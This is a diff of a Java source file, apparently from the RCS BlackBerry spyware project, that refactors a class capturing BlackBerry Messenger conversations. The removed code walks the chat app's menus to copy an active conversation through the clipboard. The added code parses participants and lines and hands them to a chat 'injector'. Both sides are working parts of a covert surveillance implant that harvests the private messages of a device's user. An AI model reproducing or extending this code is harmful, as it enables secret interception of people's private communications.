@@ -7,23 +7,15 @@
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
 
-package blackberry.module.im;
+package blackberry.injection.injectors.conversation;
 
 import java.util.Vector;
 
-import net.rim.device.api.system.Application;
-import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.Clipboard;
-import net.rim.device.api.ui.Screen;
-import net.rim.device.api.ui.UiApplication;
-import blackberry.Messages;
 import blackberry.Status;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.injection.MenuWalker;
-import blackberry.module.ModuleChat;
-import blackberry.module.ModuleClipboard;
+import blackberry.injection.injectors.group.ChatGroupInjector;
 import blackberry.utils.StringUtils;
 
 public class ConversationScreen {
@@ -35,12 +27,6 @@ public class ConversationScreen {
     private static Vector parts;
     private static String partecipants;
 
-    private UiApplication bbmApplication;
-    // Vector<Screen>
-    //private Vector conversationScreens = new Vector();
-    // Hashtable<Screen,CRC32>
-    //Hashtable conversations = new Hashtable();
-
     private String lastConversation = null;
 
     private Object busyLock = new Object();
@@ -49,8 +35,9 @@ public class ConversationScreen {
     /**
      * retrieves the screen, if it's the conversation one, calls the copy and
      * parses the content
+     * @param injector 
      */
-    public void getConversationScreen() {
+    public void getConversationScreen(String newConversation, ChatGroupInjector injector) {
 
         synchronized (busyLock) {
             if (busy) {
@@ -61,57 +48,29 @@ public class ConversationScreen {
         }
 
         try {
-            if (bbmApplication == null || !Backlight.isEnabled()) {
+
+  
+            // parse della conversazione.
+            // result e' un vettore di stringhe
+            Vector result = parseConversation(newConversation, lastConversation);
+            lastConversation = newConversation;
+
+            if (result != null) {
+                //#ifdef DBC
+                Check.asserts(result.size() == 2,
+                        "wrong size result:  " + result.size()); //$NON-NLS-1$
+                //#endif
+
+                //#ifdef DEBUG
+                debug.trace("getConversationScreen: extract vector elements"); //$NON-NLS-1$
+                //#endif
+                String partecipants = (String) result.elementAt(0);
+                Vector lines = (Vector) result.elementAt(1);
+                
+                injector.addLines(partecipants,lines);
+
                 if (Status.self().wantLight()) {
-                    Debug.ledFlash(Debug.COLOR_RED);
-                }
-                return;
-            }
-
-            Screen screen = bbmApplication.getActiveScreen();
-
-            //#ifdef DEBUG
-            debug.info("leech active screen: " + screen); //$NON-NLS-1$
-            //#endif
-
-            if (bbmApplication.isForeground()) {
-                //1g.0=ConversationScreen
-                if (screen.getClass().getName()
-                        .indexOf(Messages.getString("1g.0")) >= 0) { //$NON-NLS-1$
-
-                    String newConversation = extractConversation(screen);
-
-                    // parse della conversazione.
-                    // result e' un vettore di stringhe
-                    Vector result = parseConversation(newConversation,
-                            lastConversation);
-                    lastConversation = newConversation;
-
-                    if (result != null) {
-                        //#ifdef DBC
-                        Check.asserts(result.size() == 2,
-                                "wrong size result:  " + result.size()); //$NON-NLS-1$
-                        //#endif
-
-                        //#ifdef DEBUG
-                        debug.trace("getConversationScreen: extract vector elements"); //$NON-NLS-1$
-                        //#endif
-                        String partecipants = (String) result.elementAt(0);
-                        Vector lines = (Vector) result.elementAt(1);
-
-                        ModuleChat agent = (ModuleChat) ModuleChat
-                                .getInstance();
-                        agent.add(partecipants, lines);
-
-                        if (Status.self().wantLight()) {
-                            Debug.ledFlash(Debug.COLOR_YELLOW);
-                        }
-                    }
-                } else {
-                    //#ifdef DEBUG
-                    debug.trace("getConversationScreen no screen: " //$NON-NLS-1$
-                            + screen.getClass().getName());
-                    //#endif
+                    Debug.ledFlash(Debug.COLOR_YELLOW);
                 }
             }
 
@@ -138,40 +97,7 @@ public class ConversationScreen {
         return;
     }
 
-    private String extractConversation(Screen screen) {
-        //#ifdef DEBUG
-        debug.trace("extractConversation"); //$NON-NLS-1$
-        //#endif
-
-        //String before = (String) Clipboard.getClipboard().get();
-        String clip = null;
-        // debug.trace("try copy chat: "+screen);
-        ((ModuleClipboard) ModuleClipboard.getInstance()).suspendClip();
-        if (MenuWalker.walk(
-                new String[] { Messages.getString("1g.1"),
-                        Messages.getString("1g.2") }, //$NON-NLS-1$ //$NON-NLS-2$
-                screen, true)) {
-
-            clip = (String) Clipboard.getClipboard().get();
-            ((ModuleClipboard) ModuleClipboard.getInstance()).setClip(clip);
-
-            try {
-                //Clipboard.getClipboard().put(before);
-            } catch (Exception ex) {
-                //#ifdef DEBUG
-                debug.error("extractConversation: clip " + ex); //$NON-NLS-1$
-                //#endif
-            }
-
-        } else {
-            //#ifdef DEBUG
-            debug.info("NO Conversation screen!"); //$NON-NLS-1$
-            //#endif
-        }
-        ((ModuleClipboard) ModuleClipboard.getInstance()).resumeClip();
-        return clip;
-    }
-
+   
     public static Vector parseConversation(String newConversation) {
         return parseConversation(newConversation, null);
     }
@@ -209,7 +135,8 @@ public class ConversationScreen {
         //#endif
 
         //1g.3=Participants
-        if (lineConversation.startsWith(Messages.getString("1g.3"))) { //$NON-NLS-1$
+        //Messages.getString("1g.3")
+        if (lineConversation.startsWith("Participants")) { //$NON-NLS-1$
             full = true;
             //#ifdef DEBUG
             debug.trace("parseConversation: full"); //$NON-NLS-1$
@@ -427,14 +354,4 @@ public class ConversationScreen {
         return 0;
     }
 
-    public void setBBM(UiApplication bbmApplication) {
-        //#ifdef DEBUG
-        debug.trace("setBBM: " + bbmApplication);
-        //#endif
-        this.bbmApplication = bbmApplication;
-    }
-
-    public Application getBBMApplication() {        
-        return bbmApplication;
-    }
 }
